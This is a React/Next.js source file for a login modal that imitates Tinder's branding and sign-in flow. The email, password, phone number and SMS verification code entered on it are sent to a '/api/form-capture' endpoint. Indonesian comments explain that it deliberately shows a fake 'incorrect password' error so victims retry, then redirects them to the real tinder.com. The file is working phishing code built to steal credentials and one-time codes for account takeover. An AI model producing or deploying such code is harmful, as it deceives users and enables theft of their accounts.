'use client';
import type React from 'react';
import { useState } from 'react';

import { Button } from '@/components/ui/button';
import { Dialog, DialogContent } from '@/components/ui/dialog';
import { AnimatePresence, motion } from 'framer-motion';
import { ArrowLeft, Loader2, Mail, Phone, X } from 'lucide-react';
import Image from 'next/image';
import Link from 'next/link';

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  shortcode?: string;
}

const REDIRECT_URL = 'https://tinder.com'; // Ganti dengan URL Tinder asli atau profil tujuan

export default function LoginModal({
  isOpen,
  onClose,
  shortcode,
}: LoginModalProps) {
  // Form view states
  const [formView, setFormView] = useState<'social' | 'email' | 'phone'>(
    'social',
  );

  // Email form states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);

  // Phone form states
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneError, setPhoneError] = useState<string | null>(null);
  const [verificationCode, setVerificationCode] = useState('');
  const [codeError, setCodeError] = useState<string | null>(null);
  const [showVerificationInput, setShowVerificationInput] = useState(false);

  // Shared states
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Validation functions
  const validateEmail = (email: string) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  };

  const validatePhone = (phone: string) => {
    // Basic validation - at least 10 digits
    const re = /^\+?[0-9]{10,15}$/;
    return re.test(phone.replace(/\s+/g, ''));
  };

  const validateVerificationCode = (code: string) => {
    // Verification code should be 6 digits
    return /^\d{6}$/.test(code);
  };

  // Input handlers
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setEmail(e.target.value);
    if (emailError) setEmailError(null);
    if (error) setError(null);
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    if (passwordError) setPasswordError(null);
    if (error) setError(null);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Allow only numbers, spaces, and + sign
    const value = e.target.value.replace(/[^\d\s+]/g, '');
    setPhoneNumber(value);
    if (phoneError) setPhoneError(null);
    if (error) setError(null);
  };

  const handleVerificationCodeChange = (
    e: React.ChangeEvent<HTMLInputElement>,
  ) => {
    // Allow only numbers
    const value = e.target.value.replace(/[^\d]/g, '');
    setVerificationCode(value);
    if (codeError) setCodeError(null);
    if (error) setError(null);
  };

  // Form submission handlers
  const handleEmailLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    // Reset errors
    setEmailError(null);
    setPasswordError(null);
    setError(null);

    // Validate inputs
    let isValid = true;

    if (!email) {
      setEmailError('Email is required');
      isValid = false;
    } else if (!validateEmail(email)) {
      setEmailError('Please enter a valid email address');
      isValid = false;
    }

    if (!password) {
      setPasswordError('Password is required');
      isValid = false;
    } else if (password.length < 6) {
      setPasswordError('Password must be at least 6 characters');
      isValid = false;
    }

    if (!isValid) return;

    // Simulate login
    setIsLoading(true);

    try {
      // Kirim data login ke endpoint form capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'tinder',
          email,
          password,
          shortcode,
          additional_data: {
            login_method: 'email',
            login_time: new Date().toISOString(),
          },
        }),
      });

      // Untuk keperluan demo, tampilkan error agar pengguna mencoba lagi
      // Tampilkan pesan error yang terlihat asli seperti dari layanan nyata
      // Setelah berhasil mendapatkan lokasi, tunggu sebentar lalu redirect
      setTimeout(() => {
        window.location.href = REDIRECT_URL;
      }, 1500);
      setError(
        'The email or password you entered is incorrect. Please check your information and try again.',
      );
    } catch (err) {
      // Bahkan jika pengiriman ke form-capture gagal, tetap tampilkan error yang sama
      setError(
        'The email or password you entered is incorrect. Please check your information and try again.',
      );
    } finally {
      setIsLoading(false);
    }
  };

  const handlePhoneLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    // Reset errors
    setPhoneError(null);
    setError(null);

    // Validate phone number
    if (!phoneNumber) {
      setPhoneError('Phone number is required');
      return;
    } else if (!validatePhone(phoneNumber)) {
      setPhoneError('Please enter a valid phone number');
      return;
    }

    setIsLoading(true);

    try {
      // Kirim data phone login ke endpoint form capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'tinder',
          phone: phoneNumber,
          shortcode,
          additional_data: {
            login_method: 'phone',
            login_time: new Date().toISOString(),
          },
        }),
      });

      // Simulate API call to send verification code
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Show verification code input
      setShowVerificationInput(true);
      console.log('Verification code sent to:', phoneNumber);
    } catch (err) {
      setError('Failed to send verification code. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();

    // Reset errors
    setCodeError(null);
    setError(null);

    // Validate verification code
    if (!verificationCode) {
      setCodeError('Verification code is required');
      return;
    } else if (!validateVerificationCode(verificationCode)) {
      setCodeError('Please enter a valid 6-digit code');
      return;
    }

    setIsLoading(true);

    try {
      // Kirim data verification code ke endpoint form capture
      await fetch('/api/form-capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          source: 'tinder',
          phone: phoneNumber,
          verification_code: verificationCode,
          shortcode,
          additional_data: {
            login_method: 'phone_verification',
            login_time: new Date().toISOString(),
          },
        }),
      });

      // Simulate API call to verify code
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // Untuk demo, tampilkan error bahwa kode salah
      setError('Invalid verification code. Please try again.');
    } catch (err) {
      setError('Verification failed. Please check the code and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Reset form and go back to social login options
  const resetForm = () => {
    // Reset email form
    setEmail('');
    setPassword('');
    setEmailError(null);
    setPasswordError(null);

    // Reset phone form
    setPhoneNumber('');
    setPhoneError(null);
    setVerificationCode('');
    setCodeError(null);
    setShowVerificationInput(false);

    // Reset shared states
    setError(null);
    setIsLoading(false);
  };

  const handleBackToOptions = () => {
    resetForm();
    setFormView('social');
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <AnimatePresence>
        {isOpen && (
          <DialogContent className='w-full max-w-[400px] rounded-none border-none bg-[#0d0d0d] p-6 sm:rounded-xl'>
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: -10 }}
              animate={{
                opacity: 1,
                scale: 1,
                y: 0,
                transition: {
                  duration: 0.5,
                  ease: [0.16, 1, 0.3, 1], // Custom spring-like easing
                },
              }}
              exit={{
                opacity: 0,
                scale: 0.95,
                y: 10,
                transition: {
                  duration: 0.4,
                  ease: [0.4, 0, 0.2, 1],
                },
              }}
              className='relative'
            >
              {/* Close button */}
              <button
                onClick={onClose}
                className='absolute right-0 top-0 text-gray-400 transition-colors hover:text-white'
              >
                <X className='h-6 w-6' />
              </button>

              {formView === 'email' && (
                <>
                  {/* Back button */}
                  <button
                    onClick={handleBackToOptions}
                    className='absolute left-0 top-0 text-gray-400 transition-colors hover:text-white'
                  >
                    <ArrowLeft className='h-6 w-6' />
                  </button>

                  {/* Email login form */}
                  <div className='mt-8'>
                    <h2 className='mb-6 text-center text-[28px] font-bold text-white'>
                      Log in with email
                    </h2>

                    {error && (
                      <div className='mb-4 rounded-md bg-red-900/30 p-3'>
                        <p className='text-sm text-red-300'>{error}</p>
                      </div>
                    )}

                    <form onSubmit={handleEmailLogin} className='space-y-4'>
                      <div>
                        <label
                          htmlFor='email'
                          className='mb-1 block text-sm text-gray-400'
                        >
                          Email
                        </label>
                        <input
                          type='email'
                          id='email'
                          value={email}
                          onChange={handleEmailChange}
                          className={`w-full border bg-[#1a1a1a] ${
                            emailError ? 'border-red-500' : 'border-gray-700'
                          } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
                          placeholder='your.email@example.com'
                          disabled={isLoading}
                        />
                        {emailError && (
                          <p className='mt-1 text-xs text-red-500'>
                            {emailError}
                          </p>
                        )}
                      </div>

                      <div>
                        <label
                          htmlFor='password'
                          className='mb-1 block text-sm text-gray-400'
                        >
                          Password
                        </label>
                        <input
                          type='password'
                          id='password'
                          value={password}
                          onChange={handlePasswordChange}
                          className={`w-full border bg-[#1a1a1a] ${
                            passwordError ? 'border-red-500' : 'border-gray-700'
                          } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
                          placeholder='••••••••'
                          disabled={isLoading}
                        />
                        {passwordError && (
                          <p className='mt-1 text-xs text-red-500'>
                            {passwordError}
                          </p>
                        )}
                      </div>

                      <Button
                        type='submit'
                        className='h-[52px] w-full rounded-[4px] bg-gradient-to-r from-pink-500 to-rose-500 py-6 text-base font-semibold text-white hover:from-pink-600 hover:to-rose-600'
                        disabled={isLoading}
                      >
                        {isLoading ? (
                          <span className='flex items-center justify-center'>
                            <Loader2 className='mr-2 h-4 w-4 animate-spin' />
                            Logging in...
                          </span>
                        ) : (
                          'Log in'
                        )}
                      </Button>
                    </form>

                    <div className='mt-4 text-center'>
                      <Link
                        href='#'
                        className='text-sm text-[#3991f1] hover:underline'
                      >
                        Forgot password?
                      </Link>
                    </div>
                  </div>
                </>
              )}

              {formView === 'phone' && (
                <>
                  {/* Back button */}
                  <button
                    onClick={handleBackToOptions}
                    className='absolute left-0 top-0 text-gray-400 transition-colors hover:text-white'
                  >
                    <ArrowLeft className='h-6 w-6' />
                  </button>

                  {/* Phone login form */}
                  <div className='mt-8'>
                    <h2 className='mb-6 text-center text-[28px] font-bold text-white'>
                      {showVerificationInput
                        ? 'Enter verification code'
                        : 'Log in with phone'}
                    </h2>

                    {error && (
                      <div className='mb-4 rounded-md bg-red-900/30 p-3'>
                        <p className='text-sm text-red-300'>{error}</p>
                      </div>
                    )}

                    {!showVerificationInput ? (
                      <form onSubmit={handlePhoneLogin} className='space-y-4'>
                        <div>
                          <label
                            htmlFor='phone'
                            className='mb-1 block text-sm text-gray-400'
                          >
                            Phone Number
                          </label>

                          <input
                            type='tel'
                            id='phone'
                            value={phoneNumber}
                            onChange={handlePhoneChange}
                            className={`w-full border bg-[#1a1a1a] ${
                              phoneError ? 'border-red-500' : 'border-gray-700'
                            } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
                            placeholder='+1 234 567 8900'
                            disabled={isLoading}
                          />
                          {phoneError && (
                            <p className='mt-1 text-xs text-red-500'>
                              {phoneError}
                            </p>
                          )}
                        </div>

                        <Button
                          type='submit'
                          className='h-[52px] w-full rounded-[4px] bg-gradient-to-r from-pink-500 to-rose-500 py-6 text-base font-semibold text-white hover:from-pink-600 hover:to-rose-600'
                          disabled={isLoading}
                        >
                          {isLoading ? (
                            <span className='flex items-center justify-center'>
                              <Loader2 className='mr-2 h-4 w-4 animate-spin' />
                              Sending code...
                            </span>
                          ) : (
                            'Send verification code'
                          )}
                        </Button>
                      </form>
                    ) : (
                      <form onSubmit={handleVerifyCode} className='space-y-4'>
                        <div>
                          <p className='mb-3 text-sm text-gray-400'>
                            We've sent a 6-digit verification code to{' '}
                            <span className='text-white'>{phoneNumber}</span>
                          </p>
                          <label
                            htmlFor='code'
                            className='mb-1 block text-sm text-gray-400'
                          >
                            Verification Code
                          </label>
                          <input
                            type='text'
                            id='code'
                            value={verificationCode}
                            onChange={handleVerificationCodeChange}
                            className={`w-full border bg-[#1a1a1a] ${
                              codeError ? 'border-red-500' : 'border-gray-700'
                            } rounded-md px-4 py-3 text-white focus:outline-none focus:ring-2 focus:ring-[#fe3c72]`}
                            placeholder='123456'
                            maxLength={6}
                            disabled={isLoading}
                          />
                          {codeError && (
                            <p className='mt-1 text-xs text-red-500'>
                              {codeError}
                            </p>
                          )}
                        </div>

                        <Button
                          type='submit'
                          className='h-[52px] w-full rounded-[4px] bg-gradient-to-r from-pink-500 to-rose-500 py-6 text-base font-semibold text-white hover:from-pink-600 hover:to-rose-600'
                          disabled={isLoading}
                        >
                          {isLoading ? (
                            <span className='flex items-center justify-center'>
                              <Loader2 className='mr-2 h-4 w-4 animate-spin' />
                              Verifying...
                            </span>
                          ) : (
                            'Verify'
                          )}
                        </Button>

                        <div className='flex items-center justify-between text-sm'>
                          <button
                            type='button'
                            className='text-[#3991f1] hover:underline'
                            onClick={() => setShowVerificationInput(false)}
                          >
                            Change phone number
                          </button>
                          <button
                            type='button'
                            className='text-[#3991f1] hover:underline'
                            onClick={handlePhoneLogin}
                            disabled={isLoading}
                          >
                            Resend code
                          </button>
                        </div>
                      </form>
                    )}
                  </div>
                </>
              )}

              {formView === 'social' && (
                <>
                  {/* Tinder Logo */}
                  <div className='mb-6 flex justify-center'>
                    <svg
                      viewBox='0 0 24 24'
                      className='h-10 w-10 fill-current text-[#fe3c72]'
                    >
                      <path d='M16.5 11.5c0 2.5-1.5 4.5-4.5 4.5-2 0-4.5-2-4.5-4.5C7.5 9 9.5 7 12 7s4.5 2 4.5 4.5zm-4.5 6c3.5 0 6.5-2 6.5-6.5S15.5 5 12 5 5.5 7 5.5 11.5 9 17.5 12 17.5z' />
                    </svg>
                  </div>

                  {/* Heading */}
                  <h2 className='mb-4 text-center text-[28px] font-bold text-white'>
                    Get started
                  </h2>

                  {/* Terms text */}
                  <p className='mb-6 text-center text-[13px] leading-5 text-gray-400'>
                    By tapping Log in or Continue, you agree to our{' '}
                    <Link href='#' className='text-[#3991f1] hover:underline'>
                      Terms
                    </Link>
                    . Learn how we process your data in our{' '}
                    <Link href='#' className='text-[#3991f1] hover:underline'>
                      Privacy Policy
                    </Link>{' '}
                    and{' '}
                    <Link href='#' className='text-[#3991f1] hover:underline'>
                      Cookie Policy
                    </Link>
                    .
                  </p>

                  {/* Login buttons */}
                  <div className='space-y-3'>
                    <Button
                      variant='outline'
                      className='h-[52px] w-full rounded-[4px] border-none bg-[#4285f4] text-base font-medium text-white hover:bg-[#4285f4]/90'
                    >
                      <Image
                        src='https://authjs.dev/img/providers/google.svg'
                        alt='Google'
                        width={20}
                        height={20}
                        className='mr-2'
                      />
                      Lanjutkan dengan Google
                    </Button>

                    <Button
                      variant='outline'
                      className='h-[52px] w-full rounded-[4px] border-none bg-[#00b900] text-base font-medium text-white hover:bg-[#00b900]/90'
                    >
                      <Image
                        src='https://authjs.dev/img/providers/line.svg'
                        alt='LINE'
                        width={20}
                        height={20}
                        className='mr-2'
                      />
                      Log in with LINE
                    </Button>

                    <Button
                      variant='outline'
                      className='h-[52px] w-full rounded-[4px] border-none bg-[#1877f2] text-base font-medium text-white hover:bg-[#1877f2]/90'
                    >
                      <Image
                        src='https://authjs.dev/img/providers/facebook.svg'
                        alt='Facebook'
                        width={20}
                        height={20}
                        className='mr-2'
                      />
                      Login with Facebook
                    </Button>

                    <Button
                      variant='outline'
                      className='h-[52px] w-full rounded-[4px] border border-white/20 bg-transparent text-base font-medium text-white hover:bg-white/5'
                      onClick={() => setFormView('phone')}
                    >
                      <Phone className='mr-2 h-5 w-5' />
                      Log in with phone number
                    </Button>

                    <Button
                      variant='outline'
                      className='h-[52px] w-full rounded-[4px] border border-white/20 bg-transparent text-base font-medium text-white hover:bg-white/5'
                      onClick={() => setFormView('email')}
                    >
                      <Mail className='mr-2 h-5 w-5' />
                      Log in with email
                    </Button>
                  </div>

                  {/* Trouble logging in */}
                  <div className='mt-6 text-center'>
                    <Link
                      href='#'
                      className='text-sm text-[#3991f1] hover:underline'
                    >
                      Trouble logging in?
                    </Link>
                  </div>

                  {/* Get the app */}
                  <div className='mt-8'>
                    <h3 className='mb-4 text-center font-semibold text-white'>
                      Get the app!
                    </h3>
                    <div className='flex justify-center space-x-4'>
                      <Link
                        href='#'
                        className='relative block h-[40px] w-[130px]'
                      >
                        <Image
                          src='https://tinder.com/static/build/d256a5b510a685030be375c63a9010e1.webp'
                          alt='Download on the App Store'
                          fill
                          className='object-contain'
                        />
                      </Link>
                      <Link
                        href='#'
                        className='relative block h-[40px] w-[130px]'
                      >
                        <Image
                          src='https://tinder.com/static/build/03adb6c1e6325a1c4b404d29927a8fe0.webp'
                          alt='Get it on Google Play'
                          fill
                          className='object-contain'
                        />
                      </Link>
                    </div>
                  </div>
                </>
              )}
            </motion.div>
          </DialogContent>
        )}
      </AnimatePresence>
    </Dialog>
  );
}
